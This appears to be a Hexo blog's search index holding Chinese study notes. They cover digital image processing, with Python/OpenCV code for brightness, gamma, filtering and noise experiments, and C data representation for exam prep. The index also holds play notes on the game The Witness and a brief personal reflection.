<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>数字图像处理学习笔记</title>
    <url>/2023/10/08/%E6%95%B0%E5%AD%97%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="图像处理概述"><a href="#图像处理概述" class="headerlink" title="图像处理概述"></a>图像处理概述</h1><p>数字图像具有整数坐标值和整数灰度值</p>
<p>人眼欠调或者过调现象称为<code>马赫带效应</code>，因为人眼的亮度变化并不明显</p>
<span id="more"></span>
<h2 id="数字图像处理三个层次"><a href="#数字图像处理三个层次" class="headerlink" title="数字图像处理三个层次"></a>数字图像处理三个层次</h2><ol>
<li>低级图像处理</li>
<li>中级图像处理</li>
<li>高级图像处理</li>
</ol>
<h2 id="空域滤波与领域运算"><a href="#空域滤波与领域运算" class="headerlink" title="空域滤波与领域运算"></a>空域滤波与领域运算</h2><p>空域滤波：</p>
<p>$g(x,y)=T[f(x,y) ]$</p>
<p>$f(x,y)$是输出的图形的灰度值，而$g(x,y)$是输出图像的灰度值，$T$是输入图像的像素点$(x,y)$及其指定领域的灰度值进行处理的操作符</p>
<h3 id="均值滤波"><a href="#均值滤波" class="headerlink" title="均值滤波"></a>均值滤波</h3><h3 id="高斯滤波"><a href="#高斯滤波" class="headerlink" title="高斯滤波"></a>高斯滤波</h3><h3 id="阈值领域平滑滤波"><a href="#阈值领域平滑滤波" class="headerlink" title="阈值领域平滑滤波"></a>阈值领域平滑滤波</h3><h2 id="实验2："><a href="#实验2：" class="headerlink" title="实验2："></a>实验2：</h2><ul>
<li><h3 id="编程实现图像的灰度变换，包括图像变暗、图像变亮、降低对比度和直方图均衡化处理"><a href="#编程实现图像的灰度变换，包括图像变暗、图像变亮、降低对比度和直方图均衡化处理" class="headerlink" title="编程实现图像的灰度变换，包括图像变暗、图像变亮、降低对比度和直方图均衡化处理"></a>编程实现图像的灰度变换，包括图像变暗、图像变亮、降低对比度和直方图均衡化处理</h3></li>
</ul>
<p>做法: 使用<code>python</code>的函数，图像变暗、图像变亮、降低对比度方式都可以使用全局线性表变换实现。而直方图均衡化可以调用OpenCV<code>工具包中的</code>equalizehist（）函数来实现。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimHei&#x27;</span>]</span><br><span class="line">plt.figure(figsize=(<span class="number">10</span>, <span class="number">5</span>))</span><br><span class="line">OffsetNumber = <span class="number">150</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hist</span>(<span class="params">image, title</span>):</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">global</span> OffsetNumber</span><br><span class="line">    OffsetNumber = OffsetNumber + <span class="number">1</span></span><br><span class="line">    plt.subplot(OffsetNumber)</span><br><span class="line">    <span class="comment"># 可视化直方图</span></span><br><span class="line">    <span class="comment"># 计算直方图</span></span><br><span class="line">    hist, bins = np.histogram(image.ravel(), <span class="number">256</span>, [<span class="number">0</span>, <span class="number">256</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算像素总数</span></span><br><span class="line">    total_pixels = <span class="built_in">len</span>(image.ravel())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算概率直方图</span></span><br><span class="line">    hist_probability = hist / total_pixels</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制概率直方图</span></span><br><span class="line">    plt.hist(bins[:-<span class="number">1</span>], bins, weights=hist_probability, rwidth=<span class="number">0.8</span>)</span><br><span class="line">    plt.xlabel(<span class="string">&#x27;灰度级别&#x27;</span>)</span><br><span class="line">    plt.ylabel(<span class="string">&#x27;概率&#x27;</span>)</span><br><span class="line">    plt.ylim([<span class="number">0</span>, <span class="number">0.04</span>])</span><br><span class="line">    plt.title(title)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以灰度模式打开dog.png图片</span></span><br><span class="line">image = cv2.imread(<span class="string">&quot;dog.png&quot;</span>,cv2.IMREAD_GRAYSCALE)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 图像变亮或者变暗</span></span><br><span class="line">factor = <span class="number">0.4</span>  <span class="comment"># 调整此值以控制变亮或者变暗程度</span></span><br><span class="line">darkened_image = np.clip(image * factor,<span class="number">0</span>,<span class="number">255</span>).astype(np.uint8)</span><br><span class="line">factor = <span class="number">1.2</span></span><br><span class="line">brighted_image = np.clip(image * factor,<span class="number">0</span>,<span class="number">255</span>).astype(np.uint8)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;darkened_image.jpg&#x27;</span>, darkened_image)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;brighted.jpg&#x27;</span>, brighted_image)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 降低对比度</span></span><br><span class="line"><span class="comment"># 设置线性变换参数</span></span><br><span class="line">alpha = <span class="number">0.5</span>  <span class="comment"># 控制对比度的因子，可以根据需要调整</span></span><br><span class="line">beta = <span class="number">128</span>   <span class="comment"># 控制亮度的偏移值，可以根据需要调整</span></span><br><span class="line"><span class="comment"># 应用线性变换</span></span><br><span class="line">low_contrast_image = cv2.convertScaleAbs(image, alpha=alpha, beta=beta)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;low_contrast_image.jpg&#x27;</span>, low_contrast_image)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 使用函数equalizeHist() 是的直方图均衡化</span></span><br><span class="line">eualImage = cv2.equalizeHist(image)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;output_equalizeHist_image.jpg&#x27;</span>, eualImage)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可视化图片输出过程</span></span><br><span class="line">hist(image,<span class="string">&#x27;原图&#x27;</span>)</span><br><span class="line">hist(darkened_image,<span class="string">&#x27;图像变暗&#x27;</span>)</span><br><span class="line">hist(brighted_image, <span class="string">&#x27;图像变亮&#x27;</span>)</span><br><span class="line">hist(low_contrast_image, <span class="string">&#x27;降低对比度&#x27;</span>)</span><br><span class="line">hist(eualImage,<span class="string">&#x27;直方图均值化&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.tight_layout()</span><br><span class="line"></span><br><span class="line">plt.savefig(<span class="string">&quot;Experiment 1.png&quot;</span>)</span><br><span class="line">plt.show()</span><br><span class="line">plt.close</span><br></pre></td></tr></table></figure>
<p>效果:</p>
<ul>
<li><h3 id="编程实现图像的gamma变换"><a href="#编程实现图像的gamma变换" class="headerlink" title="编程实现图像的gamma变换"></a>编程实现图像的gamma变换</h3></li>
</ul>
<p>使用具体做法是先归一化到1，然后gamma作为指数值求出新的像素值再还原</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取图像</span></span><br><span class="line">image = cv2.imread(<span class="string">&quot;a_iris.tif&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义Gamma值</span></span><br><span class="line">gamma = <span class="number">0.5</span>  <span class="comment"># 调整此值以改变Gamma值，通常在0.1到3之间</span></span><br><span class="line">gamma_table = np.array([((i / <span class="number">255.0</span>) ** gamma) * <span class="number">255</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)], dtype=np.uint8)</span><br><span class="line">gamma_corrected_image = cv2.LUT(image, gamma_table)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存Gamma校正后的图像</span></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;gamma_corrected_image.png&#x27;</span>, gamma_corrected_image)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li><h3 id="掌握图像空域滤波方法。修改代码，使用以下滤波算子对图像进行滤波，查看滤波效果，并从平滑-锐化、轮廓模糊-轮廓清晰等方面分析滤波效果"><a href="#掌握图像空域滤波方法。修改代码，使用以下滤波算子对图像进行滤波，查看滤波效果，并从平滑-锐化、轮廓模糊-轮廓清晰等方面分析滤波效果" class="headerlink" title="掌握图像空域滤波方法。修改代码，使用以下滤波算子对图像进行滤波，查看滤波效果，并从平滑/锐化、轮廓模糊/轮廓清晰等方面分析滤波效果"></a>掌握图像空域滤波方法。修改代码，使用以下滤波算子对图像进行滤波，查看滤波效果，并从平滑/锐化、轮廓模糊/轮廓清晰等方面分析滤波效果</h3></li>
</ul>
<p>做法: 抄写书本中给的函数，然后通过修改滤波核查看其效果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取图像</span></span><br><span class="line"><span class="comment">#image = cv2.imread(&quot;a_iris.tif&quot;, cv2.IMREAD_GRAYSCALE)</span></span><br><span class="line">image = cv2.imread(<span class="string">&quot;a_iris.tif&quot;</span>)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./S/Original image.png&#x27;</span>, image)</span><br><span class="line"></span><br><span class="line">fil0=<span class="number">1</span>/<span class="number">16</span>*np.array([ <span class="comment"># 设置滤波核1</span></span><br><span class="line">    [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">2</span>,<span class="number">4</span>,<span class="number">2</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">fil1=<span class="number">1</span>/<span class="number">9</span>*np.array([ <span class="comment"># 设置滤波核2</span></span><br><span class="line">    [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">fil2=<span class="number">1</span>/<span class="number">10</span>*np.array([ <span class="comment"># 设置滤波核3</span></span><br><span class="line">    [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">fil3=np.array([ <span class="comment"># 设置滤波核4</span></span><br><span class="line">    [-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>],</span><br><span class="line">    [-<span class="number">1</span>,<span class="number">9</span>,-<span class="number">1</span>],</span><br><span class="line">    [-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用OpenCV卷积函数</span></span><br><span class="line">ImgSmoothed=cv2.filter2D(image,-<span class="number">1</span>,fil0,borderType=cv2.BORDER_DEFAULT)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./S/Smoothed image0.png&#x27;</span>, ImgSmoothed)</span><br><span class="line">ImgSmoothed=cv2.filter2D(image,-<span class="number">1</span>,fil1,borderType=cv2.BORDER_DEFAULT)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./S/Smoothed image1.png&#x27;</span>, ImgSmoothed)</span><br><span class="line">ImgSmoothed=cv2.filter2D(image,-<span class="number">1</span>,fil2,borderType=cv2.BORDER_DEFAULT)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./S/Smoothed image2.png&#x27;</span>, ImgSmoothed)</span><br><span class="line">ImgSmoothed=cv2.filter2D(image,-<span class="number">1</span>,fil3,borderType=cv2.BORDER_DEFAULT)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./S/Smoothed image3.png&#x27;</span>, ImgSmoothed)</span><br></pre></td></tr></table></figure>
<ul>
<li><h3 id="首先对图像添加椒盐噪声或高斯噪声，然后对加噪图像进行均值滤波、中值滤波和高斯滤波，滤波效果如实验图4所示，查看并分析滤波效果。"><a href="#首先对图像添加椒盐噪声或高斯噪声，然后对加噪图像进行均值滤波、中值滤波和高斯滤波，滤波效果如实验图4所示，查看并分析滤波效果。" class="headerlink" title="首先对图像添加椒盐噪声或高斯噪声，然后对加噪图像进行均值滤波、中值滤波和高斯滤波，滤波效果如实验图4所示，查看并分析滤波效果。"></a>首先对图像添加椒盐噪声或高斯噪声，然后对加噪图像进行均值滤波、中值滤波和高斯滤波，滤波效果如实验图4所示，查看并分析滤波效果。</h3></li>
</ul>
<p>在python函数中添加其函数,在实现之后查看其效果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_gaussian_noise</span>(<span class="params">image, mean=<span class="number">0</span>, std=<span class="number">25</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;为图像添加高斯噪声&quot;&quot;&quot;</span></span><br><span class="line">    row, col, ch = image.shape</span><br><span class="line">    gauss = np.random.normal(mean, std, (row, col, ch))</span><br><span class="line">    noisy = np.clip(image + gauss, <span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">    noisy = noisy.astype(np.uint8)</span><br><span class="line">    <span class="keyword">return</span> noisy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_salt_and_pepper_noise</span>(<span class="params">image, salt_prob=<span class="number">0.05</span>, pepper_prob=<span class="number">0.05</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;为图像添加椒盐噪声&quot;&quot;&quot;</span></span><br><span class="line">    noisy = image.copy()</span><br><span class="line">    total_pixels = image.size</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加椒噪声</span></span><br><span class="line">    num_salt = <span class="built_in">int</span>(total_pixels * salt_prob)</span><br><span class="line">    salt_coords = [np.random.randint(<span class="number">0</span>, high, num_salt) <span class="keyword">for</span> high <span class="keyword">in</span> image.shape[:<span class="number">2</span>]]</span><br><span class="line">    noisy[salt_coords[<span class="number">0</span>], salt_coords[<span class="number">1</span>], :] = <span class="number">1</span>  <span class="comment"># 白色</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加盐噪声</span></span><br><span class="line">    num_pepper = <span class="built_in">int</span>(total_pixels * pepper_prob)</span><br><span class="line">    pepper_coords = [np.random.randint(<span class="number">0</span>, high, num_pepper) <span class="keyword">for</span> high <span class="keyword">in</span> image.shape[:<span class="number">2</span>]]</span><br><span class="line">    noisy[pepper_coords[<span class="number">0</span>], pepper_coords[<span class="number">1</span>], :] = <span class="number">0</span>  <span class="comment"># 黑色</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> noisy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">image = cv2.imread(<span class="string">&#x27;a_iris.tif&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加高斯噪声</span></span><br><span class="line">noisy_image_gaussian = add_gaussian_noise(image)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加椒盐噪声</span></span><br><span class="line">noisy_image_salt_pepper = add_salt_and_pepper_noise(image)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存添加噪声后的图像</span></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./Work4/noisy_image_gaussian.jpg&#x27;</span>, noisy_image_gaussian)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./Work4/noisy_image_salt_pepper.jpg&#x27;</span>, noisy_image_salt_pepper)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 均值滤波  </span></span><br><span class="line">blur_gaussian = cv2.blur(noisy_image_gaussian,(<span class="number">3</span>,<span class="number">3</span>))</span><br><span class="line">blur_salt_pepper = cv2.blur(noisy_image_salt_pepper,(<span class="number">3</span>,<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./Work4/blur_gaussian.jpg&#x27;</span>,blur_gaussian)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./Work4/blur_salt_pepper.jpg&#x27;</span>,blur_salt_pepper)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中值滤波</span></span><br><span class="line">medianBlur_gaussian = cv2.medianBlur(noisy_image_gaussian,<span class="number">3</span>)</span><br><span class="line">medianBlur_salt_pepper = cv2.medianBlur(noisy_image_salt_pepper,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./Work4/medianBlur_gaussian.jpg&#x27;</span>,medianBlur_gaussian)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./Work4/medianBlur_salt_pepper.jpg&#x27;</span>,medianBlur_salt_pepper)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 高斯滤波</span></span><br><span class="line"></span><br><span class="line">GaussianBlur_gaussian = cv2.GaussianBlur(noisy_image_gaussian,(<span class="number">3</span>,<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line">GaussianBlur_salt_pepper = cv2.GaussianBlur(noisy_image_salt_pepper,(<span class="number">3</span>,<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./Work4/GaussianBlur_gaussian.jpg&#x27;</span>,GaussianBlur_gaussian)</span><br><span class="line">cv2.imwrite(<span class="string">&#x27;./Work4/GaussianBlur_salt_pepper.jpg&#x27;</span>,GaussianBlur_salt_pepper)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id><a href="#" class="headerlink" title=" "></a> </h3><h3 id="计算图像的灰度，均值，方差，以及煽"><a href="#计算图像的灰度，均值，方差，以及煽" class="headerlink" title="计算图像的灰度，均值，方差，以及煽"></a>计算图像的灰度，均值，方差，以及煽</h3><p>计算均值的数学公式: </p>
<script type="math/tex; mode=display">
Mean =  \frac{1}{M \times N}\sum_{i=1}^{M}\sum_{i=1}^{N}I(i,j)</script><p>计算方差的数学公式:</p>
<script type="math/tex; mode=display">
Variance = \frac{1}{M \times N}\sum_{i=1}^{M}\sum_{i=1}^{N}(I(i,j) - Mean)^2</script><p>计算熵的公式:</p>
<script type="math/tex; mode=display">
H(s) = -\sum_{L=0}^{255} p_i*log_2p_i\\
p_i = \frac{i}{(M\times N)} \space,\space i为出现的个数</script><p>共生矩阵：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">uint8 co_array[M][N]</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; col - <span class="number">1</span>; j++) &#123;</span><br><span class="line">        co_array[image[i][j]][image[i][j+<span class="number">1</span>]]++</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出co_array</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title>游戏-见证者游玩笔记/心得</title>
    <url>/2023/10/07/Playing/%E8%A7%81%E8%AF%81%E8%80%85-The-Witness/</url>
    <content><![CDATA[<p> 由于我是从第六章开始记录的</p>
<h3 id="见证者商店链接"><a href="#见证者商店链接" class="headerlink" title="见证者商店链接"></a><a href="https://store.steampowered.com/app/210970/The_Witness/">见证者商店链接</a></h3><h2 id="攻略视频"><a href="#攻略视频" class="headerlink" title="攻略视频"></a><a href="https://www.bilibili.com/video/BV13F411v7HS">攻略视频</a></h2><h3 id="序章-庭院"><a href="#序章-庭院" class="headerlink" title="序章 庭院"></a>序章 庭院</h3><p>欢迎你，见证者</p>
<h3 id="第一章-樱花树林"><a href="#第一章-樱花树林" class="headerlink" title="第一章 樱花树林"></a>第一章 樱花树林</h3><p>换种视角，也许有新发现</p>
<p>观察樱花与树枝的关系，注意断了的树枝。</p>
<h3 id="第二章-海岸"><a href="#第二章-海岸" class="headerlink" title="第二章 海岸"></a>第二章 海岸</h3><p>不要总在一颗树上吊死</p>
<p>对称轴谜题，新增视觉干扰项，如透明原点对称等。透明板可能与背景有关。</p>
<h3 id="第三章-沙漠"><a href="#第三章-沙漠" class="headerlink" title="第三章 沙漠"></a>第三章 沙漠</h3><p>相信光明，只为照亮黑暗</p>
<p>需要光线射入的角度，有些辣眼睛。</p>
<h3 id="第四章-枫叶林"><a href="#第四章-枫叶林" class="headerlink" title="第四章 枫叶林"></a>第四章 枫叶林</h3><p>有时候，眼见不一定为实</p>
<p>寻找阴影与</p>
<h3 id="第五章-神庙"><a href="#第五章-神庙" class="headerlink" title="第五章 神庙"></a>第五章 神庙</h3><p>看似是绊脚石，实则是铺路石</p>
<h3 id="第六章-湿地"><a href="#第六章-湿地" class="headerlink" title="第六章 湿地"></a>第六章 湿地</h3><p>是时候增加难度了<br>谜题: 每一个由线条围住的区域都满足区域内的图案. 图案允许叠加 - 思路 找到个数再划分区域</p>
<h3 id="第七章-树屋"><a href="#第七章-树屋" class="headerlink" title="第七章 树屋"></a>第七章 树屋</h3><p>逆水行舟，不进则退</p>
<p>八角星谜题和圆形谜题:</p>
<p>八角星谜题: 每一个由线条围住的区域有且只有两个八角星(如果八角星为奇数个, 则需要与<strong>带颜色</strong>的圆形组合)</p>
<p>圆形谜题: 每一个由线条围住的区域有且只有一种颜色, 每个区域颜色之间可以相同</p>
<h3 id="第八章-城堡"><a href="#第八章-城堡" class="headerlink" title="第八章 城堡"></a>第八章 城堡</h3><p>寻得出路，莫忘来时路</p>
<p>迷宫1: 栏杆为障碍,答案为绕过栏杆的路径</p>
<p>迷宫2:杂草为障碍,答案为绕过杂草的路径</p>
<p>迷宫3:水泥路声音为障碍,答案为需要绕过杂音的路径</p>
<p>迷宫4:迷宫与题目不一样, 只要在迷宫内找到一条路径,能够对应上题目的线条即可.</p>
<p>接下来的迷宫都是综合前面的谜题, 把图案画成对应答案的样子</p>
<p>迷宫N:</p>
<p><img src="https://s2.loli.net/2023/10/10/SWj2RLEfBHdkUco.png" alt="迷宫N" style="zoom: 67%;"><br>文字谜题</p>
<p><img src="https://s2.loli.net/2023/10/11/FDMvCLe6YSOsxX3.png" alt="image-20231010214132813" style="zoom: 50%;"></p>
<h3 id="第九章-丛林"><a href="#第九章-丛林" class="headerlink" title="第九章 丛林"></a>第九章 丛林</h3><p>静心，倾听</p>
<p>听音乐, 由音乐判断音阶点, 关卡难度不高(只要能听出来)</p>
<p>音阶越高, 点越小</p>
<p>有几个有干扰选项的. 太难听出来了,实在是.  </p>
<h3 id="第十章-温室"><a href="#第十章-温室" class="headerlink" title="第十章 温室"></a>第十章 温室</h3><p>稍安勿躁,静观其变</p>
<p>通过环境谜题来解密, 透过几层滤镜可以看到其颜色, 表示其方块的正确位置</p>
<h3 id="第十一章-采石场"><a href="#第十一章-采石场" class="headerlink" title="第十一章 采石场"></a>第十一章 采石场</h3><p>唯有无暇, 才能表示完美</p>
<h3 id="第十二章"><a href="#第十二章" class="headerlink" title="第十二章"></a>第十二章</h3><p>温故而知新</p>
<p>该章为谜题大检查</p>
<p><img src="C:/Users/FAN/AppData/Roaming/Typora/typora-user-images/image-20231025214649396.png" alt="image-20231025214649396"> </p>
<p>环境谜题</p>
<p>采石场消去谜题</p>
<p><img src="C:/Users/FAN/AppData/Roaming/Typora/typora-user-images/image-20231025215818539.png" alt="image-20231025215818539"></p>
<p>该谜题: </p>
<ul>
<li>神庙 </li>
<li>树影</li>
<li>沙漠</li>
</ul>
<p><img src="C:/Users/FAN/AppData/Roaming/Typora/typora-user-images/image-20231025215906020.png" alt="image-20231025215906020"></p>
<p><img src="https://s2.loli.net/2023/10/25/y7gKsOBR9Tju64Z.png" alt="image-20231025220212494"></p>
<h3 id="终章-地底"><a href="#终章-地底" class="headerlink" title="终章 地底"></a>终章 地底</h3><p> 此处新增过边谜题</p>
<p><strong>留声机挑战</strong> : 有点困难, 谜题随机, 有的难有的简单.</p>
<p><img src="https://s2.loli.net/2024/03/23/xNBGwgR6sma1ifV.png" alt="image-20240323004107944"></p>
<p><img src="https://s2.loli.net/2024/03/23/goKLkdBSxFpGNEr.png" alt="image-20240323004117199"></p>
<p><img src="https://s2.loli.net/2024/03/23/68bTsk5MzHQ9qfa.png" alt="image-20240323004127708"></p>
<p><img src="https://s2.loli.net/2024/03/23/E5UOmxlqjndAYz8.png" alt="image-20240323004135959"></p>
<p><img src="https://s2.loli.net/2024/03/23/WzSQwlrbZyVmUNC.png" alt="image-20240323004310351"></p>
]]></content>
  </entry>
  <entry>
    <title>想了那么多,不是很想打比赛了</title>
    <url>/2022/06/07/Think/%E4%B8%80%E7%82%B9%E6%83%B3%E6%B3%95/</url>
    <content><![CDATA[<p> 大学快过去一年的时间了,自己的理解和感悟仍然是那么的菜<br>“放弃”并止损<br>做好当下吧</p>
<!--- more -->
]]></content>
  </entry>
  <entry>
    <title>数据的表示和运算的思维导图</title>
    <url>/2024/08/10/Study/408-p3/</url>
    <content><![CDATA[<h1 id="数据的表示和运算"><a href="#数据的表示和运算" class="headerlink" title="数据的表示和运算"></a>数据的表示和运算</h1><h2 id="常⻅考法"><a href="#常⻅考法" class="headerlink" title="常⻅考法"></a>常⻅考法</h2><pre class="mermaid"> graph LR
            A[常⻅考法] --> B(C语⾔程序
分析“数据的表示和运算”)
            A --> C(结合机器级代码分析“数据的表示和运算”
（通常也会给出对应的C语⾔程序）)

            B --> D(【2020】43题)
            B --> E(【2017】43题)
            B --> ED(【2011】43题)
            C --> F(【2021】43题)
            C --> W(【2019】45题)
            C --> G(【2017】44题)
            C --> L(【2014】44题)
            C --> S(【2013】44题)</pre>









<h2 id="大题重点关注"><a href="#大题重点关注" class="headerlink" title="大题重点关注"></a>大题重点关注</h2><h3 id="数据的表示"><a href="#数据的表示" class="headerlink" title="数据的表示"></a>数据的表示</h3><ul>
<li>无符号整数<ul>
<li><code>unsigned short</code></li>
<li><code>unsigned int</code></li>
</ul>
</li>
</ul>
<ul>
<li><p>带符号</p>
<ul>
<li><code>short</code></li>
<li><code>int</code></li>
</ul>
<blockquote>
<p><strong>C语言常见整数类型</strong></p>
<ol>
<li>记住<ul>
<li>$2 ^ {16} = 65535$ </li>
<li>$2 ^ {15} = 32768$ </li>
</ul>
</li>
<li>带符号 <code>short</code> <ul>
<li>$-32768 \space \textasciitilde \space 32767$</li>
</ul>
</li>
<li>无符号 <code>unsigned short</code> <ul>
<li>$0\space \textasciitilde \space 65535$</li>
</ul>
</li>
</ol>
</blockquote>
</li>
<li><p><code>IEEE754</code>浮点数 </p>
<ul>
<li>结构: 符号位 + 阶码 + 尾数<ul>
<li>[x] <code>float</code>: $1 + 8 + 23$</li>
<li>[ ] <code>double</code>: $1 + 11 + 52$</li>
<li>[ ] <code>long double</code>:  $1 + 15  + 64 $</li>
</ul>
</li>
</ul>
</li>
<li><p>C语言数据类型转换</p>
<ul>
<li><p>整数之间的转换</p>
<ul>
<li>[ ] 长度相同<ul>
<li>机器数不变,解释方式改变(带符号整数,无符号整数)</li>
</ul>
</li>
<li>[ ] 短变长<ul>
<li>先扩展（⽆符号整数零扩展、带符号整数符号扩展），再解释</li>
</ul>
</li>
<li>[ ] 长变短<ul>
<li>先截断（留低位），再解释</li>
</ul>
</li>
</ul>
</li>
<li><p>整数和浮点数之间的转换</p>
<ul>
<li><p>[ ] 整数转浮点数</p>
<ul>
<li><p>写出⼈类视⻆的科学计数法 <code>1.xxxx</code>，再转为浮点数，截断尾部时采⽤ <code>0</code> 舍 <code>1</code> ⼊原则</p>
</li>
<li><p>[x] 注意：精度丢失问题</p>
</li>
</ul>
</li>
<li><p>[ ] 浮点数转整数</p>
<ul>
<li><p>写出⼆进制⼩数，去掉⼩数部分，整数部分保留</p>
<p>更低的位数</p>
</li>
<li><p>[x] 注意：溢出问题、精度丢失（⼩数点后的部分）</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="数据的运算"><a href="#数据的运算" class="headerlink" title="数据的运算"></a>数据的运算</h3><ul>
<li><strong>加减法</strong><ul>
<li>⽆符号整数<ul>
<li>[ ] 加法规则<ul>
<li>机算 —- 按位相加</li>
<li>⼿算 —- 带⼊十进制计算</li>
</ul>
</li>
<li>[ ] 减法规则<ul>
<li>机算 —- 减数按位取反末位加1，减法变加法</li>
<li>⼿算 —- 带⼊十进制计算</li>
</ul>
</li>
<li>[x] 溢出问题<ul>
<li>机算 —- <strong>:red_circle: 根据CF标志位判断，<code>CF</code>= <code>最⾼位产⽣的进位</code> 异或<code>sub</code></strong></li>
<li>⼿算 —- 判断加减法的结果是否超出⽆符号数合法范围</li>
</ul>
</li>
</ul>
</li>
<li>带符号整数<ul>
<li>[ ] 加法规则<ul>
<li>机算 —- 按位相加</li>
<li>⼿算 —- 带⼊十进制计算</li>
</ul>
</li>
<li>[ ] 减法规则<ul>
<li>机算 —- 减数按位取反末位加1，减法变加法</li>
<li>⼿算 —- 带⼊十进制计算</li>
</ul>
</li>
<li>[x] 溢出问题<ul>
